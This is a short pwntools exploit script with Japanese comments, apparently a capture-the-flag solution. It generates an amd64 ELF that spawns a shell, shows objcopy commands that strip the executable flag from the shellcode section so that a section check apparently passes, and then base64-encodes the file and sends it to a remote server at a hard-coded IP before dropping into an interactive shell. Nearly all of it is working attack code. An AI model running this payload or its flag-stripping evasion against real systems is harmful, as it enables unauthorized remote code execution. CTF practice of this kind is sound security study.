from pwn import *
from base64 import b64encode

# NOTE: セクションはリンク時やデバッグ時に参照される情報。
# SHF_EXECINSTR フラグを落としても、プログラムが実行不可能になるわけではない。

# ********************************************************
# exploit ファイルの生成
# ********************************************************
context.arch = 'amd64'
elf = ELF.from_assembly(shellcraft.sh())
# elf.save("exploit")

# ********************************************************
# exploit ファイルの編集
# ********************************************************

"""
⬢ [Docker] ❯ readelf -S exploit2
...
  [ 1] .shellcode        PROGBITS         0000000010000000  00001000
       0000000000000030  0000000000000000 WAX       0     0     1
...

⬢ [Docker] ❯ objcopy --set-section-flags .shellcode=contents,alloc,load exploit

⬢ [Docker] ❯ readelf -S exploit2
...
  [ 1] .shellcode        PROGBITS         0000000010000000  00001000
       0000000000000030  0000000000000000  WA       0     0     1
...
"""

# ********************************************************
# 送信
# ********************************************************
# io = process(["python", "fairy.mod.py"])
io = remote("20.84.72.194", 5002)

data = b64encode(open("exploit", "rb").read())
io.sendlineafter(b"!!", data)
io.interactive()
